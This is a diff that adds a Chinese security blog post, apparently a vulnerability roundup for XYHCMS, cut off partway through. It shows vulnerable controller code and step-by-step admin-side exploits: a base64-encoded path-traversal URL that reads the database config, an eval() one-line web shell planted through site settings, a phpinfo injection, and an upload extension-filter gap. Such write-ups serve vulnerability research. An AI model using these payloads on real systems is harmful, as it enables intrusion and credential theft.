@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.0">
+<meta name="google-site-verification" content="DPsEF01SMytD4bnWQ221G1mMmGqFRfanBwmVZh7ACaU" />
+<meta name="baidu-site-verification" content="9w2JQKMeTC" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://h3art3ars.github.io').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="phpthink架构的xyhcms漏洞整理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyhcms漏洞整理">
+<meta property="og:url" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;2020&#x2F;01&#x2F;27&#x2F;xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86&#x2F;index.html">
+<meta property="og:site_name" content="h3art3ars">
+<meta property="og:description" content="phpthink架构的xyhcms漏洞整理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;xyhcms-1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;xyhcms-2.png">
+<meta property="article:published_time" content="2020-01-27T07:35:37.000Z">
+<meta property="article:modified_time" content="2020-01-27T07:44:06.000Z">
+<meta property="article:author" content="h3art3ars">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="cms">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;xyhcms-1.png">
+
+<link rel="canonical" href="http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>xyhcms漏洞整理 | h3art3ars</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="h3art3ars" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+	
+	<script type="text/javascript"
+		color="51,204,204 " opacity='0.5' zIndex="-2" count="120" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+	
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h3art3ars</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">路漫漫其修远兮，吾将上下而求索</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="h3art3ars">
+      <meta itemprop="description" content="笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h3art3ars">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          xyhcms漏洞整理
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-27 15:35:37 / 修改时间：15:44:06" itemprop="dateCreated datePublished" datetime="2020-01-27T15:35:37+08:00">2020-01-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">phpthink架构的xyhcms漏洞整理</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h2><ul>
+<li>v3.5</li>
+<li>v3.6</li>
+<li>v2</li>
+</ul>
+<h3 id="任意文件读取（后台）"><a href="#任意文件读取（后台）" class="headerlink" title="任意文件读取（后台）"></a>任意文件读取（后台）</h3><ul>
+<li><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/App/Manage/Controller/TempletsController.class.php 第59-83行：</p>
+</li>
+<li><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>没有对传入的fname参数进行过滤</p>
+</li>
+<li><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function edit() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">	$ftype &#x3D; I(&#39;ftype&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">	$fname &#x3D; I(&#39;fname&#39;, &#39;&#39;, &#39;trim,htmlspecialchars&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">	$file_path &#x3D; !$ftype ? &#39;.&#x2F;Public&#x2F;Home&#x2F;&#39; . C(&#39;CFG_THEMESTYLE&#39;) . &#39;&#x2F;&#39; : &#39;.&#x2F;Public&#x2F;Mobile&#x2F;&#39; . C(&#39;CFG_MOBILE_THEMESTYLE&#39;) . &#39;&#x2F;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">		if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">			$this-&gt;error(&#39;未指定文件名&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">		$_ext &#x3D; &#39;.&#39; . pathinfo($fname, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">		$_cfg_ext &#x3D; C(&#39;TMPL_TEMPLATE_SUFFIX&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">		if ($_ext !&#x3D; $_cfg_ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">			$this-&gt;error(&#39;文件后缀必须为&quot;&#39; . $_cfg_ext . &#39;&quot;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">		$content &#x3D; I(&#39;content&#39;, &#39;&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">		$fname &#x3D; ltrim($fname, &#39;.&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">		$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">		if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">			$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">		&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">		$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">		if (stripos($content, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">			$this-&gt;error(&#39;模板内容禁止包含php代码！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">		if (false !&#x3D;&#x3D; file_put_contents($truefile, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">			$this-&gt;success(&#39;保存成功&#39;, U(&#39;index&#39;, array(&#39;ftype&#39; &#x3D;&gt; $ftype)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">		&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">			$this-&gt;error(&#39;保存文件失败，请重试&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">		exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">	$fname &#x3D; base64_decode($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">	var_dump($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">	&#x2F;&#x2F;exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">	if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">		$this-&gt;error(&#39;未指定要编辑的文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">	$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">	if (!file_exists($truefile)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">		$this-&gt;error(&#39;文件不存在&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">	$content &#x3D; file_get_contents($truefile);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">	if ($content &#x3D;&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">		$this-&gt;error(&#39;读取文件失败&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">	$content &#x3D; htmlspecialchars($content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">	$this-&gt;assign(&#39;ftype&#39;, $ftype);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">	$this-&gt;assign(&#39;fname&#39;, $fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">	$this-&gt;assign(&#39;content&#39;, $content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">	$this-&gt;assign(&#39;type&#39;, &#39;修改模板&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">	$this-&gt;display();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li>数据库配置文件路径：<code>\App\Common\Conf\db.php</code> </li>
+<li>组成相对路径 <code>..\\..\\..\\App\\Common\\Conf\\db.php</code></li>
+<li>base64编码，<code>Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li>
+<li>最后构造的链接形式如下：<code>http://127.0.0.1/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li>
+</ol>
+</li>
+<li><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>下载v3.5，发现代码已经做了过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">				$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">			&#125;</span></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="文件写入导致代码执行漏洞（后台）"><a href="#文件写入导致代码执行漏洞（后台）" class="headerlink" title="文件写入导致代码执行漏洞（后台）"></a>文件写入导致代码执行漏洞（后台）</h3><ul>
+<li><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p>
+</li>
+<li><h4 id="漏洞原因-1"><a href="#漏洞原因-1" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对写入文件的内容过滤不严</p>
+</li>
+<li><h4 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function site() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">		if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">			$data &#x3D; I(&#39;config&#39;, array(), &#39;trim&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">			&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">			$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">			foreach ($data as $key &#x3D;&gt; $val) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">				if (stripos($val, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">					$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;\?php(.+?)\?&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">				&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">				if (stripos($val, &#39;&lt;script&#39;) !&#x3D;&#x3D; false &amp;&amp; stripos($val, &#39;php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">					$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">				&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">				if (stripos($data[$key], &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $data[$key])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">					$this-&gt;error(&#39;禁止输入php代码&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">				&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">			&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">			————————————————————————————————————————————————————————————————————————————</span></pre></td></tr></table></figure>
+</li>
+<li><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li><p>进入后台</p>
+</li>
+<li><p>系统设置-&gt;网站设置-&gt;会员配置-&gt;禁止使用的名称</p>
+<p><img src="/images/xyhcms-1.png" alt="xyhcms"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?eval($_POST[&#39;cmd&#39;])?&gt;</span></pre></td></tr></table></figure>
+</li>
+<li><p>访问漏洞文件,蚁剑连接</p>
+<p><code>http://localhost/App/Runtime/Data/config/site.php</code></p>
+<p>POST数据：<code>cmd=phpinfo();</code></p>
+</li>
+</ol>
+</li>
+<li><h4 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.6也存在</p>
+</li>
+</ul>
+<h3 id="文件写入导致代码执行漏洞2（后台）"><a href="#文件写入导致代码执行漏洞2（后台）" class="headerlink" title="文件写入导致代码执行漏洞2（后台）"></a>文件写入导致代码执行漏洞2（后台）</h3><ul>
+<li><h4 id="漏洞原因-2"><a href="#漏洞原因-2" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>过滤不严</p>
+</li>
+<li><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li><p>进入后台</p>
+</li>
+<li><p>系统设置-&gt;网站设置找个任意的配置</p>
+</li>
+<li><p>在输入框内都填</p>
+<p><code>&lt;?php phpinfo()?&gt;</code></p>
+</li>
+<li><p>访问漏洞文件</p>
+<p><code>http://localhost/App/Runtime/Data/config/site.php</code></p>
+</li>
+<li><p>此漏洞在最新版的v3.6也存在</p>
+</li>
+</ol>
+</li>
+<li><h4 id="实际利用-2"><a href="#实际利用-2" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.5，v3.6都利用成功</p>
+</li>
+</ul>
+<h3 id="文件上传漏洞（后台-amp-配置了-htaccess）"><a href="#文件上传漏洞（后台-amp-配置了-htaccess）" class="headerlink" title="文件上传漏洞（后台&amp;配置了.htaccess）"></a>文件上传漏洞（后台&amp;配置了.htaccess）</h3><ul>
+<li><h4 id="漏洞文件位置-2"><a href="#漏洞文件位置-2" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code> Line 246-255</p>
+</li>
+<li><h4 id="漏洞原因-3"><a href="#漏洞原因-3" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对后缀过滤不严，未过滤php3-5，phtml（老版本直接未过滤php）</p>
+</li>
+<li><h4 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>在site方法中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">				$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">				$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">				$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">				foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">					if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">						$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">					&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">				&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">			&#125;</span></pre></td></tr></table></figure>
+</li>
+<li><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li><p>进入后台</p>
+</li>
